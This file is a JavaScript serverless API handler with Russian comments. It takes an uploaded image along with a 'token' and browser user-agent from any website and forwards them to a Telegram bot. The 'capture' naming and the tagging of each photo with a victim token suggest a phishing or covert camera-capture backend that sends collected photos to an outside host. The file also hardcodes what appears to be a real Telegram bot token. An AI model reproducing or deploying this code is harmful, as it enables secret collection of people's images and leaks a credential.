import formidable from 'formidable';
import fs from 'fs';

export const config = {
    api: {
        bodyParser: false,
    },
};

const BOT_TOKEN = "8255755052:AAFjHxgUKDccQVi33kWGuUXkARcR85CxXDQ";

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const form = formidable({ multiples: false });
        
        const [fields, files] = await new Promise((resolve, reject) => {
            form.parse(req, (err, fields, files) => {
                if (err) reject(err);
                resolve([fields, files]);
            });
        });

        const imageFile = files.image;
        const token = fields.token?.[0];
        const ua = fields.ua?.[0] || 'Unknown';

        if (!imageFile || !token) {
            return res.status(400).json({ error: 'Missing data' });
        }

        // Читаем файл
        const imageData = fs.readFileSync(imageFile.filepath);
        
        // Отправляем в Telegram
        const formData = new FormData();
        formData.append('chat_id', '0');
        formData.append('photo', new Blob([imageData]), 'photo.jpg');
        formData.append('caption', JSON.stringify({ token, ua, time: new Date().toISOString() }));

        const tgResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        if (!tgResponse.ok) {
            const error = await tgResponse.text();
            console.error('Telegram error:', error);
            
            // Пробуем как документ
            const docFormData = new FormData();
            docFormData.append('chat_id', '0');
            docFormData.append('document', new Blob([imageData]), 'photo.jpg');
            docFormData.append('caption', JSON.stringify({ token, ua }));
            
            await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
                { method: 'POST', body: docFormData }
            );
        }

        // Удаляем временный файл
        fs.unlinkSync(imageFile.filepath);
        
        res.status(200).json({ success: true });

    } catch (error) {
        console.error('Capture error:', error);
        res.status(500).json({ error: error.message });
    }
}
